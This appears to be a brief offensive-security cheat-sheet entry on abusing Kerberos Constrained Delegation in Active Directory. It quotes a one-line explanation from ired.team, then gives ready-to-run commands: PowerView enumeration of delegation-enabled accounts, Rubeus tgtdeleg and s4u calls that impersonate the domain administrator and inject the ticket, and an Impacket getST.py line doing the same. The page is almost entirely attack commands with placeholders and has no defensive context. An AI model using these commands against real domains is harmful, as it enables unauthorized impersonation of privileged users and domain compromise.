# KCD

## **Theory**

> If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to. [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

## Method

* Find user with KCD enabled : `Get-NetUser -TrustedToAuth`
  * User has to have an attribute `TRUSTED_TO_AUTH_FOR_DELEGATION`
*   With Rubeus :

    ```
    Rubeus.exe tgtdeleg
    Rubeus.exe s4u /ticket:<BASE64> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:<SERVICE>/<SERVER> /dc:<DOMAIN_CONTROLER> /ptt
    ```

    * `Rubeus.exe s4u /user:<USERNAME> /rc4:<HASH> /impersonateuser:<USER_TO_IMPERSONATE> /domain:<DOMAIN> /dc:<DOMAIN_CONTROLER> /msdsspn:<SERVICE>/<SERVER> /ptt`
* With Impacket : `getST.py -spn <SERVICE>/<SERVER> '<DOMAIN>/<USERNAME>:<PWD>' -impersonate Administrator -dc-ip <IP>`
